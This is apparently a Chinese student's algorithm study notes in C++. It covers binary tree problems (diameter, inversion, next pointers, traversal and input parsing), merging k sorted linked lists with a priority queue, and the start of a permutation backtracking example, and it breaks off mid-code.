<h2 id="543二叉树的直径"><a href="#543二叉树的直径" class="headerlink" title="543二叉树的直径"></a>543二叉树的直径</h2><p>给你一棵二叉树的根节点，返回该树的 直径 。</p>
<p>二叉树的 直径 是指树中任意两个节点之间最长路径的 长度 。这条路径可能经过也可能不经过根节点 root 。</p>
<p>两节点之间路径的 长度 由它们之间边数表示。</p>
<p><img src="/../../../Typora/img111/image-20230712101353602.png" alt="image-20230712101353602"></p>
<p>输入：root &#x3D; [1,2,3,4,5]<br>输出：3<br>解释：3 ，取路径 [4,2,1,3] 或 [5,2,1,3] 的长度。<br>示例 2：</p>
<p>输入：root &#x3D; [1,2]<br>输出：1</p>
<h3 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h3><p>长度&#x3D;左子树深度+右子树深度</p>
<p><strong>所以求depth(1)，必求depth(2)和depth(3)</strong></p>
<p><strong>求depth(2)，必求depth(4)和depth(5)</strong></p>
<p>递归思想是先解决<strong>子问题</strong>，再回到整体问题。</p>
<p>以下代码所示（注意，不正确）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int depth(TreeNode * root)</span><br><span class="line">&#123;</span><br><span class="line">	if(root==nullptr) return 0;</span><br><span class="line">	int left=depth(root-&gt;left);</span><br><span class="line">	int right=depth(root-&gt;right);</span><br><span class="line">	</span><br><span class="line">    return left+right+1;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">//调用该函数depth(root)</span><br></pre></td></tr></table></figure>

<p>int left&#x3D;depth(root-&gt;left);当root为4时，执行该行</p>
<p>好，从头执行depth(左孩子)，4的左孩子是空指针，返回值得到0，赋值left&#x3D;0</p>
<p>进入下一行</p>
<p>int right&#x3D;depth(root-&gt;right);进入该行</p>
<p>从头执行depth(右孩子)，4的右孩子是空指针，返回值得到0，赋值right&#x3D;0</p>
<p>进入下一行</p>
<p>return left+right+1;进入该行。</p>
<p>得到depth(4)的返回值为1。</p>
<p>同理depth(5)的返回值为1。</p>
<p>则depth(2)的长度为2。</p>
<p><strong>当然，少考虑了一种情况，如果不经过根节点嘞，即只有左子树或只有右子树情况</strong></p>
<p><img src="/../../../Typora/img111/image-20230712103553998.png" alt="image-20230712103553998"></p>
<p>这个是时候可以一眼看出，直径为3，而不是2了吧。</p>
<p>这就需要<strong>取左子树和右子树深度的最大值了</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int res=0;</span><br><span class="line">...</span><br><span class="line">int depth(TreeNode * root)</span><br><span class="line">&#123;</span><br><span class="line">	if(root==nullptr) return 0;</span><br><span class="line">	int left=depth(root-&gt;left);</span><br><span class="line">	int right=depth(root-&gt;right);</span><br><span class="line">	//后序位置</span><br><span class="line">	res=max(left+right,res);</span><br><span class="line">    return max(left,right)+1;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">//调用</span><br></pre></td></tr></table></figure>

<p><strong>遇到子树问题，首先想到的是给函数设置返回值，然后在后序位置做文章。</strong></p>
<h2 id="动态规划-x2F-回溯-x2F-DFS"><a href="#动态规划-x2F-回溯-x2F-DFS" class="headerlink" title="动态规划&#x2F;回溯&#x2F;DFS"></a>动态规划&#x2F;回溯&#x2F;DFS</h2><h3 id="动态规划例子"><a href="#动态规划例子" class="headerlink" title="动态规划例子"></a>动态规划例子</h3><p>计算二叉树共有多少个节点</p>
<p><strong>着眼结构相同的子类问题</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int count(TreeNode * root)</span><br><span class="line">&#123;</span><br><span class="line">	if(root==nullptr) return 0;</span><br><span class="line">	int left=count(root-&gt;left);</span><br><span class="line">	int right=count(root-&gt;right);</span><br><span class="line">	</span><br><span class="line">	return left+right+1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>斐波那契</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int fib(int N)</span><br><span class="line">&#123;</span><br><span class="line">	if(N==1||N==2) return 1;//递归出口</span><br><span class="line">	return fib(N-1)+fib(N-2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="回溯-1"><a href="#回溯-1" class="headerlink" title="回溯"></a>回溯</h3><p>遍历的思路，traverse()，打印出遍历二叉树的过程</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void travers(TreeNode * root)</span><br><span class="line">&#123;</span><br><span class="line">	if(root==nullptr) return;</span><br><span class="line">	printf(&quot;从结点%s到%s&quot;,root,root-&gt;left);</span><br><span class="line">	travers(root-&gt;left);</span><br><span class="line">	printf(&quot;从结点%s回到%s&quot;,root-&gt;left,root);</span><br><span class="line">	</span><br><span class="line">	printf(&quot;从结点%s到%s&quot;,root,root-&gt;right);</span><br><span class="line">	travers(root-&gt;right);</span><br><span class="line">	printf(&quot;从结点%s回到%s&quot;,root-&gt;right,root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多叉树遍历</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Node&#123;</span><br><span class="line">public:</span><br><span class="line">	int val;</span><br><span class="line">	vector&lt;Node*&gt; children;</span><br><span class="line">&#125;;</span><br><span class="line">void travers(Node *root)</span><br><span class="line">&#123;</span><br><span class="line">	if(root==nullptr) return;</span><br><span class="line">	for(Node * child=root;root-&gt;children!=nullptr;root=root-&gt;children)</span><br><span class="line">	&#123;</span><br><span class="line">		printf(&quot;从结点%s到%s&quot;,root,child);</span><br><span class="line">		travers(child);</span><br><span class="line">		printf(&quot;从结点%s回到%s&quot;,child,root);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>多叉树的遍历框架可以延伸到回溯法</p>
<p><strong>着眼节点之间的移动</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void backtrack()</span><br><span class="line">&#123;</span><br><span class="line">	for(int i=0;i&lt;...,i++)</span><br><span class="line">	&#123;</span><br><span class="line">	//做选择</span><br><span class="line">	...</span><br><span class="line">	//进入下一层决策树</span><br><span class="line">	backtrack(...);</span><br><span class="line">	</span><br><span class="line">	//撤销刚才做的选择</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h3><p>深度遍历</p>
<p>travers函数使得二叉树每个结点值+1</p>
<p><strong>着眼于单个结点上的操作</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void traverse(TreeNode* root)</span><br><span class="line">&#123;</span><br><span class="line">	if(root==nullptr) return;</span><br><span class="line">	root-&gt;val+=1;</span><br><span class="line">	traverse(root.left);</span><br><span class="line">	traverse(root.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DFS与回溯区别"><a href="#DFS与回溯区别" class="headerlink" title="DFS与回溯区别"></a>DFS与回溯区别</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(root==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;结点%s来了&quot;</span>,root);</span><br><span class="line">	<span class="comment">/*for (vector&lt;Node*&gt;::iterator it = root-&gt;children.begin(); it != root-&gt;children.end(); ++it)*/</span></span><br><span class="line">	<span class="keyword">for</span>(Node* child:root-&gt;children)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">dfs</span>(child);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;结点%s走了&quot;</span>,root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void traverse(TreeNode *root)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	if(root==nullptr) return;</span><br><span class="line">	for(...)</span><br><span class="line">	&#123;</span><br><span class="line">		print(...root,child);</span><br><span class="line">		traverse(child);</span><br><span class="line">		print(...child,root);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>回溯算法，<strong>必须把“做选择”和”撤销操作”放在循环里</strong></p>
<h2 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h2><p>&#x2F;&#x2F;已知一棵树的根节点，层序遍历</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void levelbianli(TreeNode* root)</span><br><span class="line">&#123;</span><br><span class="line">	if(root==nullptr) return;</span><br><span class="line">	queue&lt;TreeNode*&gt; q;</span><br><span class="line">	q.push(root);</span><br><span class="line">	//从上到下</span><br><span class="line">	while(!q.empty())</span><br><span class="line">	&#123;</span><br><span class="line">		int index=q.size();</span><br><span class="line">		//从左到右</span><br><span class="line">		for(int i=0;i&lt;index;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			TreeNode* cur=q.front();</span><br><span class="line">			q.pop();</span><br><span class="line">			//将下一层结点放入队列</span><br><span class="line">			if(cur-&gt;left!=nullptr)</span><br><span class="line">			q.push(cur-&gt;left);</span><br><span class="line">			if(cur-&gt;right!=nullptr)</span><br><span class="line">			q.push(cur-&gt;right);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="二叉树输入"><a href="#二叉树输入" class="headerlink" title="二叉树输入"></a>二叉树输入</h2><p>(搞了半天我这是前序接收输入，我说为什么后续遍历不对)</p>
<p>我定义了一个vector，提前接收字符串序列，如a,b,c,d；如果要转换成数值(求和)也是可以的，stoi转换一下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;string&gt; create()</span><br><span class="line">&#123;</span><br><span class="line">    string ss;</span><br><span class="line">    cin&gt;&gt;ss;</span><br><span class="line">    string token;</span><br><span class="line">    istringstream iss(ss);</span><br><span class="line">    vector&lt;string&gt; list;</span><br><span class="line">    while(getline(iss,token,&#x27;,&#x27;))</span><br><span class="line">    &#123;</span><br><span class="line">        list.push_back(token);</span><br><span class="line">    &#125;</span><br><span class="line">    iss.clear();</span><br><span class="line"></span><br><span class="line">    return list;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void receive(TreeNode* &amp;root,vector&lt;string&gt; ss)//前序接收输入</span><br><span class="line">&#123;</span><br><span class="line">    if(index&lt;ss.size())</span><br><span class="line">    &#123;</span><br><span class="line">        string tem=ss[index++];</span><br><span class="line">       // ss.pop_back();</span><br><span class="line">        if(tem==&quot;nullptr&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            root=nullptr;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            root=new TreeNode;</span><br><span class="line">            root-&gt;val=tem;</span><br><span class="line">            receive(root-&gt;left,ss);</span><br><span class="line">            receive(root-&gt;right,ss);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>层序接收输入</strong></p>
<p>#include&lt;queue&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void receive(TreeNode* &amp;root,vector&lt;string&gt;&amp; ss)</span><br><span class="line">&#123;</span><br><span class="line">   </span><br><span class="line">    if(ss.empty()) </span><br><span class="line">    &#123;</span><br><span class="line">        root=nullptr;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    root=new TreeNode(ss[0]);//初始化，并添加第一个成员</span><br><span class="line">    ss.erase(ss.begin());//去除前端</span><br><span class="line">  </span><br><span class="line">     queue &lt;TreeNode*&gt;nodequeue;</span><br><span class="line">     nodequeue.push(root);//进入第一个元素</span><br><span class="line"></span><br><span class="line">     while(!ss.empty())</span><br><span class="line">     &#123;</span><br><span class="line">        TreeNode* cur=nodequeue.front();//访问前端元素</span><br><span class="line">        nodequeue.pop();//删除前端元素</span><br><span class="line">		</span><br><span class="line">		//左孩子</span><br><span class="line">        string leftval=ss[0];//由于每次有erase的缘故，相当于访问下一个</span><br><span class="line">        ss.erase(ss.begin());//ss又减1</span><br><span class="line">        if(leftval!=&quot;nullptr&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            cur-&gt;left=new TreeNode(leftval);</span><br><span class="line">            nodequeue.push(cur-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">        if(ss.empty()) break;</span><br><span class="line">		</span><br><span class="line">		//右孩子</span><br><span class="line">		</span><br><span class="line">        string rightval=ss[0];</span><br><span class="line">        ss.erase(ss.begin());</span><br><span class="line">         if(rightval!=&quot;nullptr&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            cur-&gt;right=new TreeNode(rightval);</span><br><span class="line">            nodequeue.push(cur-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vector&lt;int&gt;版本的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct tree&#123;</span><br><span class="line"></span><br><span class="line">    int val;</span><br><span class="line">    tree *left,*right;</span><br><span class="line">   // tree():val(),left(nullptr),right(nullptr)&#123;&#125;</span><br><span class="line">    tree(int x):val(x),left(nullptr),right(nullptr)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">int start=0; //会导致输出有多余的0</span><br><span class="line">void jieshou(vector&lt;int&gt; a,tree* &amp;root)</span><br><span class="line">&#123;</span><br><span class="line">    if(start==a.size()) </span><br><span class="line">    &#123;</span><br><span class="line">        root=nullptr;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    queue&lt;tree*&gt; q;</span><br><span class="line">    root=new tree(a[start]);</span><br><span class="line"></span><br><span class="line">    q.push(root);</span><br><span class="line"></span><br><span class="line">    while(!q.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">      tree *cur=q.front();</span><br><span class="line">       q.pop();</span><br><span class="line"></span><br><span class="line">       start++;</span><br><span class="line">       //左孩子</span><br><span class="line">     //  if(a[start]!=-1) 不判断start的h话，会打印出0</span><br><span class="line">     if(start&lt;a.size()&amp;&amp;a[start]!=-1)</span><br><span class="line">       &#123;</span><br><span class="line">        cur-&gt;left=new tree(a[start]);</span><br><span class="line">        q.push(cur-&gt;left);</span><br><span class="line">       &#125;</span><br><span class="line">       if(start==a.size()) break;</span><br><span class="line"></span><br><span class="line">       //右孩子</span><br><span class="line">       start++;</span><br><span class="line">      //  if(a[start]!=-1)</span><br><span class="line">       if(start&lt;a.size()&amp;&amp;a[start]!=-1)</span><br><span class="line">       &#123;</span><br><span class="line">        cur-&gt;right=new tree(a[start]);</span><br><span class="line">        q.push(cur-&gt;right);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">void bianli(tree* root)</span><br><span class="line">&#123;</span><br><span class="line">    if(root==nullptr) return;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;root-&gt;val;</span><br><span class="line">    bianli(root-&gt;left);</span><br><span class="line">    bianli(root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    tree* node=nullptr;</span><br><span class="line">    vector&lt;int&gt; a&#123;1,2,3,4,5,6,-1&#125;;</span><br><span class="line">    jieshou(a,node);</span><br><span class="line">    bianli(node);</span><br><span class="line">//由于全局变量start=7超过索引，会打印0；1240536</span><br><span class="line">    cout&lt;&lt;endl&lt;&lt;start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="剑指55二叉树的深度"><a href="#剑指55二叉树的深度" class="headerlink" title="剑指55二叉树的深度"></a>剑指55二叉树的深度</h2><p>同104</p>
<h2 id="226-反转二叉树"><a href="#226-反转二叉树" class="headerlink" title="226 反转二叉树"></a>226 反转二叉树</h2><p>给你一棵二叉树的根节点 <code>root</code> ，翻转这棵二叉树，并返回其根节点。</p>
<p><img src="/../../../Typora/img111/image-20230712200429292.png" alt="image-20230712200429292"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [4,2,7,1,3,6,9]</span><br><span class="line">输出：[4,7,2,9,6,3,1]</span><br></pre></td></tr></table></figure>

<h3 id="个人做法"><a href="#个人做法" class="headerlink" title="个人做法"></a>个人做法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">//即从第二层开始，倒序存储</span></span><br><span class="line">    <span class="comment">//子问题，左孩子与右孩子换位置的问题</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">back</span><span class="params">(TreeNode* &amp;root)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">back</span>(root-&gt;left);</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">back</span>(root-&gt;right);</span><br><span class="line"></span><br><span class="line">        TreeNode *node=root-&gt;left;</span><br><span class="line">        root-&gt;left=root-&gt;right;</span><br><span class="line">        root-&gt;right=node;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">invertTree</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">back</span>(root);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>哎，还是很晕，不想细节了。</p>
<p>我想到的就是说孩子互换。但是按正常逻辑来说</p>
<p><strong>遍历</strong></p>
<blockquote>
<p>单独抽出个结点，让它做什么,交换它的左右孩子</p>
<p>前中后位置都可以诶，中序要特别处理一下</p>
</blockquote>
<p><strong>分解</strong></p>
<blockquote>
<p>给函数一个定义，让它逻辑自洽</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TreeNode* invertTree(TreeNode* root) &#123;</span><br><span class="line">       if(root==nullptr) return nullptr;</span><br><span class="line">       //函数定义，反转左子树，但实际是记录吧？</span><br><span class="line">       TreeNode *left=invertTree(root-&gt;left); </span><br><span class="line">       TreeNode *right=invertTree(root-&gt;right);//记录了右节点</span><br><span class="line">       </span><br><span class="line">       //交换左右节点</span><br><span class="line">       root-&gt;right=left;</span><br><span class="line">       root-&gt;left=right;</span><br><span class="line"></span><br><span class="line">       return root;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>嘶，应该是这样吧</p>
<h2 id="116-填充结点的右侧指针"><a href="#116-填充结点的右侧指针" class="headerlink" title="*116 填充结点的右侧指针"></a>*116 填充结点的右侧指针</h2><p>给定一个 <strong>完美二叉树</strong> ，其所有叶子节点都在同一层，每个父节点都有两个子节点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct Node &#123;</span><br><span class="line">  int val;</span><br><span class="line">  Node *left;</span><br><span class="line">  Node *right;</span><br><span class="line">  Node *next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>填充它的每个 next 指针，让这个指针指向其下一个右侧节点。如果找不到下一个右侧节点，则将 next 指针设置为 NULL。</p>
<p>初始状态下，所有 next 指针都被设置为 NULL。</p>
<p><img src="/../../../Typora/img111/image-20230712220310325.png" alt="image-20230712220310325"></p>
<h3 id="遍历-模拟三叉树"><a href="#遍历-模拟三叉树" class="headerlink" title="遍历(模拟三叉树)"></a>遍历(模拟三叉树)</h3><p>遍历，每个结点指向右侧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void bianli(Node* &amp;root1,Node* &amp;root2)//模拟三叉树</span><br><span class="line">&#123;</span><br><span class="line">    if(root1==nullptr||root2==nullptr)</span><br><span class="line">    &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    root1-&gt;next=root2;</span><br><span class="line">    //父节点相同的</span><br><span class="line">    bianli(root1-&gt;left,root1-&gt;right);</span><br><span class="line">    bianli(root2-&gt;left,root2-&gt;right);</span><br><span class="line">    //不同父节点的</span><br><span class="line">    bianli(root1-&gt;right,root2-&gt;left);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    Node* connect(Node* root) &#123;</span><br><span class="line">        if(root==nullptr) return nullptr;</span><br><span class="line">       bianli(root-&gt;left,root-&gt;right);</span><br><span class="line">       return root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>它通过抽象一个三叉树</p>
<p>用左边的结点指向右边的结点</p>
<p>串联有三种情况：</p>
<p>左子树间的孩子串联</p>
<p>右子树间的孩子串联</p>
<p>左子树的最右孩子和右子树的最左孩子连接</p>
<p>输入为根结点的左孩子和右孩子</p>
<p>(哎，已经默认所有next指针设为null，就不需要特别考虑设置null了)</p>
<p><strong>传统的那个遍历方式，就是少考虑了中间5-&gt;6的指向</strong></p>
<h3 id="分解不可以"><a href="#分解不可以" class="headerlink" title="分解不可以"></a>分解不可以</h3><h3 id="思想-1"><a href="#思想-1" class="headerlink" title="思想"></a>思想</h3><p>同父节点的连接</p>
<p>不同父节点的连接</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>二叉树问题</p>
<p>1.遍历</p>
<p>2.子问题</p>
<p>3.对于<strong>单独结点</strong>，需要做的事；<strong>在什么位置</strong>做这件事。（其他结点会按照该逻辑重复做下去）</p>
<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><p>合并有序链表</p>
<blockquote>
<p>目的：将两个链表按升序排列</p>
<p>1.虚拟节点的建立 :ListNode* dumpy&#x3D;new ListNode(-1);</p>
<ol start="2">
<li>访问该新链表：ListNode* p1&#x3D;dumpy;</li>
<li>访问原链表: ListNode *p&#x3D;head;</li>
<li>双指针思想</li>
</ol>
</blockquote>
<p>单链表分解</p>
<blockquote>
<p>目的：将一个链表分解成两个链表</p>
<p>1.分别新建两个虚拟节点</p>
<p>2.分别指向该新虚拟节点</p>
<p>3.访问原链表</p>
<p>4.按条件做</p>
</blockquote>
<p>合并k个有序链表</p>
<blockquote>
<p>题目：给你一个链表数组，每个链表都已经按<strong>升序</strong>排列。</p>
<p>请你将所有链表合并到一个升序链表中，返回合并后的链表。</p>
<p>目的，合并k个链表（如何获取k个链表的最小节点）</p>
<p>引入：优先级队列（二叉堆）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">priority_queue&lt;ListNode*,vector&lt;ListNode*&gt;,function&lt;bool(ListNode*,ListNode*)&gt; &gt;pq([](ListNode *a,ListNode* b)&#123;return a-&gt;val&gt;b-&gt;val&#125;);</span><br></pre></td></tr></table></figure>

<p>&lt;参数类型，容器类型，比较函数&gt;</p>
<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct cmp&#123;</span><br><span class="line">    bool operator()(ListNode *&amp;a,ListNode *&amp;b)</span><br><span class="line">    &#123;</span><br><span class="line">         return a-&gt;val&gt;b-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">...</span><br><span class="line"> priority_queue&lt;ListNode*,vector&lt;ListNode*&gt;,cmp&gt;pq;</span><br><span class="line"> priority_queue要求接受函数对象而不是函数指针	</span><br><span class="line"> </span><br><span class="line"> 函数对象，如上述struct重构operator</span><br><span class="line"> 而函数指针指的是：如</span><br><span class="line"> bool cmp(const int a, const int b) &#123;</span><br><span class="line">    return a &lt; b;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Definition for singly-linked list.</span><br><span class="line"> * struct ListNode &#123;</span><br><span class="line"> *     int val;</span><br><span class="line"> *     ListNode *next;</span><br><span class="line"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span><br><span class="line"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span><br><span class="line"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span><br><span class="line"> * &#125;;</span><br><span class="line"> */</span><br><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">struct cmp&#123;</span><br><span class="line">    bool operator()(ListNode *&amp;a,ListNode *&amp;b)</span><br><span class="line">    &#123;</span><br><span class="line">         return a-&gt;val&gt;b-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">    ListNode* mergeKLists(vector&lt;ListNode*&gt;&amp; lists) &#123;</span><br><span class="line">    </span><br><span class="line">        if(lists.empty()) return nullptr;</span><br><span class="line">        ListNode* dumpy=new ListNode(-1);//建立新链表</span><br><span class="line">        ListNode* p=dumpy;</span><br><span class="line"></span><br><span class="line">      priority_queue&lt;ListNode*,vector&lt;ListNode*&gt;,cmp&gt;pq;</span><br><span class="line">        for(ListNode* list:lists)</span><br><span class="line">        &#123;</span><br><span class="line">            if(list!=nullptr)</span><br><span class="line">                pq.push(list);//存各链表中最小的结点</span><br><span class="line">        &#125;</span><br><span class="line">/*如lists = [[1,4,5],[1,3,4],[2,6]]，pq存的是1-&gt;1&gt;2</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line">        while(!pq.empty())</span><br><span class="line">        &#123;</span><br><span class="line">            ListNode *node=pq.top();//访问</span><br><span class="line">            pq.pop();//弹出</span><br><span class="line">            p-&gt;next=node;//接到p后面</span><br><span class="line">            </span><br><span class="line">            if(node-&gt;next!=nullptr)//遍历某链表的下一个结点</span><br><span class="line">            &#123;</span><br><span class="line">                pq.push(node-&gt;next);</span><br><span class="line">            &#125;</span><br><span class="line">          </span><br><span class="line">            p=p-&gt;next;//下一个指针</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        return dumpy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>  if(node-&gt;next!&#x3D;nullptr)&#x2F;&#x2F;遍历某链表的下一个结点<br>            {<br>                pq.push(node-&gt;next);&#x2F;&#x2F;加入非空节点入优先队列（会经过排序）<br>            }<br>               pq中值为1-&gt;1-&gt;2</p>
<p>​     <strong>一开始是1</strong>，是第一个链表的[1,4,5]，<br>​            后面的是4，加入到pq，则是1-&gt;2-&gt;4<br>​            <strong>然后访问1</strong>，是第二个链表的[1,3,4]，<br>​            后面的是3，加入到pq,则是2-&gt;3-&gt;4<br>​            <strong>然后访问2</strong>，是第三个链表的[2,6]，<br>​            后面的是6，加入到pq，则是3-&gt;4-&gt;6<br>​            <strong>然后访问3</strong>,第二链表的[1,3,4]，<br>​            后面是4，加入到pq，则是4-&gt;4-&gt;6<br>​            <strong>然后访问4</strong>，第一链表的[1,4,5]，<br>​            后面的是5，加入到pq，则是4-&gt;5-&gt;6<br>​            <strong>然后访问4</strong>，第二链表的[1,3,4]<br>​            后面的是nullptr，终于不加入了，pq为5-&gt;6<br>​            <strong>然后访问5</strong>，第一链表的[1,4,5]<br>​            后面的是nullptr，pq为6<br>​            <strong>然后访问6</strong>，没啦。<br>​            </p>
</blockquote>
<h1 id="回溯-2"><a href="#回溯-2" class="headerlink" title="回溯"></a>回溯</h1><p>回溯，核心就是递归，在递归调用前<strong>选择</strong>，递归调用后<strong>撤销</strong></p>
<p>通过列表中每固定一个数（做出的选择），形成了路径</p>
<p>纯暴力解法</p>
<blockquote>
<p>1.列表中选择某点</p>
<p>#做选择</p>
<p>2.列表中移除该点</p>
<p>3.路径添加该点</p>
<p>4.递归</p>
<p>#撤销</p>
<p>5.路径移除该点</p>
<p>6.该选择恢复到列表中</p>
</blockquote>
<h2 id="全排列"><a href="#全排列" class="headerlink" title="全排列"></a>全排列</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;int&gt; &gt;res;</span><br><span class="line">void backtrack(vector&lt;int&gt; a,vector&lt;int&gt; path,vector&lt;bool&gt;used);</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;int&gt; a;</span><br><span class="line">    int num;</span><br><span class="line">    while(cin&gt;&gt;num)</span><br><span class="line">    &#123;</span><br><span class="line">        a.push_back(num);</span><br><span class="line">        if(cin.get()==&#x27;\n&#x27;) break;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;int&gt; path;//路径</span><br><span class="line">    vector&lt;bool&gt; used(a.size());</span><br><span class="line">    backtrack(a,path,used);</span><br><span class="line"></span><br><span class="line">    // for(auto li:res)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     for(auto lii:li)</span><br><span class="line">    //     cout&lt;&lt;lii;</span><br><span class="line"></span><br><span class="line">    //     cout&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void backtrack(vector&lt;int&gt; a,vector&lt;int&gt; path,vector&lt;bool&gt;used)</span><br><span class="line">&#123;</span><br><span class="line">    //触发结束条件</span><br><span class="line">    if(path.size()==a.size())</span><br><span class="line">    &#123;</span><br><span class="line">        res.push_back(path);</span><br><span class="line">        return;</span><br><span 